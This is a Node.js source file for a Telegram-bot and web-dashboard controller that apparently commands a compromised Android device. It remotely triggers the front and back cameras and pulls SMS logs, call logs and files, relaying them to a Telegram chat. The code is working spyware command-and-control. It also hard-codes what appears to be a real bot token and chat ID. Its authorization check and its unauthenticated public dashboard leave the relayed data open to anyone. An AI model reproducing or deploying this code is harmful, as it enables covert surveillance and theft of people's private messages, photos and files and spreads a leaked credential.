const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// ================= CONFIGURATION =================
const TELEGRAM_TOKEN = '8586296193:AAEIux2yt8IZ_9grKY-V9y5Zuvb1phGxwlo'; // Replace with your bot token
const ALLOWED_CHAT_ID = '5913394915';   // Replace with your Telegram user ID

// This will be set by the user via /seturl command
let devicePublicUrl = null;

// ================= EXPRESS SERVER (public dashboard) =================
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send(`
    <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Remote Bot Dashboard</title>
      <style>
        body { font-family: Arial; background: #f0f2f5; padding: 20px; text-align: center; }
        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 12px; }
        .status { background: #28a745; color: white; padding: 8px 15px; border-radius: 20px; display: inline-block; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        .btn { display: block; padding: 15px; background: #007bff; color: white; text-decoration: none; border-radius: 8px; }
        .btn-warning { background: #ffc107; color: black; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>📱 Bot Dashboard</h1>
        <div class="status">🟢 Bridge Online</div>
        <p>Device URL: ${devicePublicUrl ? `<a href="${devicePublicUrl}" target="_blank">${devicePublicUrl}</a>` : 'Not set'}</p>
        <div class="grid">
          <a href="/api/camera/back" class="btn btn-warning">📸 Back Camera</a>
          <a href="/api/camera/front" class="btn btn-warning">🤳 Front Camera</a>
          <a href="/api/sms" class="btn">📨 SMS Logs</a>
          <a href="/api/calls" class="btn">📞 Call Logs</a>
          <a href="/api/files" class="btn">📁 File Manager</a>
        </div>
      </div>
    </body>
    </html>
  `);
});

// API endpoints that forward requests to the device
app.get('/api/camera/back', async (req, res) => {
  if (!devicePublicUrl) return res.status(400).send('Device URL not set');
  try {
    await axios.get(`${devicePublicUrl}/camera/back`);
    res.send('Back camera triggered. Photo will be sent to Telegram.');
  } catch (err) {
    res.status(500).send('Error communicating with device');
  }
});

app.get('/api/camera/front', async (req, res) => {
  if (!devicePublicUrl) return res.status(400).send('Device URL not set');
  try {
    await axios.get(`${devicePublicUrl}/camera/front`);
    res.send('Front camera triggered. Photo will be sent to Telegram.');
  } catch (err) {
    res.status(500).send('Error communicating with device');
  }
});

app.get('/api/sms', async (req, res) => {
  if (!devicePublicUrl) return res.status(400).send('Device URL not set');
  try {
    const response = await axios.get(`${devicePublicUrl}/sms.txt`, { responseType: 'text' });
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="sms_logs.txt"');
    res.send(response.data);
  } catch (err) {
    res.status(500).send('Error fetching SMS logs');
  }
});

app.get('/api/calls', async (req, res) => {
  if (!devicePublicUrl) return res.status(400).send('Device URL not set');
  try {
    const response = await axios.get(`${devicePublicUrl}/calls.txt`, { responseType: 'text' });
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="call_logs.txt"');
    res.send(response.data);
  } catch (err) {
    res.status(500).send('Error fetching call logs');
  }
});

app.get('/api/files', (req, res) => {
  res.redirect(`${devicePublicUrl}/files`);
});

// ================= TELEGRAM BOT =================
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Middleware to check chat ID
bot.on('message', (msg) => {
  if (msg.chat.id.toString() !== ALLOWED_CHAT_ID) {
    bot.sendMessage(msg.chat.id, 'Unauthorized');
    return;
  }
});

// /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const opts = {
    reply_markup: {
      keyboard: [[{ text: '🔌 Connect' }]],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  };
  bot.sendMessage(chatId, `📱 Device: *Your Android Device*\n\nTap Connect to start.`, { parse_mode: 'Markdown', ...opts });
});

// Handle "Connect" button
bot.onText(/🔌 Connect/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '✅ Connected successfully!');
  // Ask for the public URL of the device (ngrok)
  bot.sendMessage(chatId, 'Please send me your device’s public URL (e.g., https://xxxx.ngrok.io) using /seturl <url>');
  // Show command menu
  showCommandMenu(chatId);
});

// /seturl command
bot.onText(/\/seturl (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1].trim();
  // Remove trailing slash
  devicePublicUrl = url.replace(/\/$/, '');
  bot.sendMessage(chatId, `✅ Device URL set to: ${devicePublicUrl}`);
});

// /local command – show current public URL
bot.onText(/\/local/, (msg) => {
  const chatId = msg.chat.id;
  if (devicePublicUrl) {
    bot.sendMessage(chatId, `🌐 Public URL:\n${devicePublicUrl}`);
  } else {
    bot.sendMessage(chatId, 'No URL set. Use /seturl <url>');
  }
});

// Camera commands
bot.onText(/\/camera_back/, async (msg) => {
  const chatId = msg.chat.id;
  if (!devicePublicUrl) return bot.sendMessage(chatId, 'Device URL not set. Use /seturl');
  try {
    await axios.get(`${devicePublicUrl}/camera/back`);
    bot.sendMessage(chatId, '📸 Back camera triggered. Photo will arrive shortly.');
  } catch (err) {
    bot.sendMessage(chatId, '❌ Failed to trigger camera. Is device online?');
  }
});

bot.onText(/\/camera_front/, async (msg) => {
  const chatId = msg.chat.id;
  if (!devicePublicUrl) return bot.sendMessage(chatId, 'Device URL not set. Use /seturl');
  try {
    await axios.get(`${devicePublicUrl}/camera/front`);
    bot.sendMessage(chatId, '🤳 Front camera triggered. Photo will arrive shortly.');
  } catch (err) {
    bot.sendMessage(chatId, '❌ Failed to trigger camera. Is device online?');
  }
});

// SMS logs – fetch and send as document
bot.onText(/\/sms/, async (msg) => {
  const chatId = msg.chat.id;
  if (!devicePublicUrl) return bot.sendMessage(chatId, 'Device URL not set. Use /seturl');
  try {
    const response = await axios.get(`${devicePublicUrl}/sms.txt`, { responseType: 'text' });
    bot.sendDocument(chatId, Buffer.from(response.data), { filename: 'sms_logs.txt' });
  } catch (err) {
    bot.sendMessage(chatId, '❌ Failed to fetch SMS logs.');
  }
});

// Call logs
bot.onText(/\/call/, async (msg) => {
  const chatId = msg.chat.id;
  if (!devicePublicUrl) return bot.sendMessage(chatId, 'Device URL not set. Use /seturl');
  try {
    const response = await axios.get(`${devicePublicUrl}/calls.txt`, { responseType: 'text' });
    bot.sendDocument(chatId, Buffer.from(response.data), { filename: 'call_logs.txt' });
  } catch (err) {
    bot.sendMessage(chatId, '❌ Failed to fetch call logs.');
  }
});

// File manager – send the URL
bot.onText(/\/files/, (msg) => {
  const chatId = msg.chat.id;
  if (!devicePublicUrl) return bot.sendMessage(chatId, 'Device URL not set. Use /seturl');
  bot.sendMessage(chatId, `📁 File manager:\n${devicePublicUrl}/files`);
});

// Help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  showCommandMenu(chatId, true);
});

function showCommandMenu(chatId, withMessage = false) {
  const opts = {
    reply_markup: {
      keyboard: [
        [{ text: '📷 /camera_back' }, { text: '📷 /camera_front' }],
        [{ text: '📨 /sms' }, { text: '📞 /call' }],
        [{ text: '📁 /files' }, { text: '🌐 /local' }],
        [{ text: '❓ /help' }]
      ],
      resize_keyboard: true
    }
  };
  const text = withMessage ? 'Commands:' : 'Use the buttons below:';
  bot.sendMessage(chatId, text, opts);
}

// ================= START SERVER =================
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});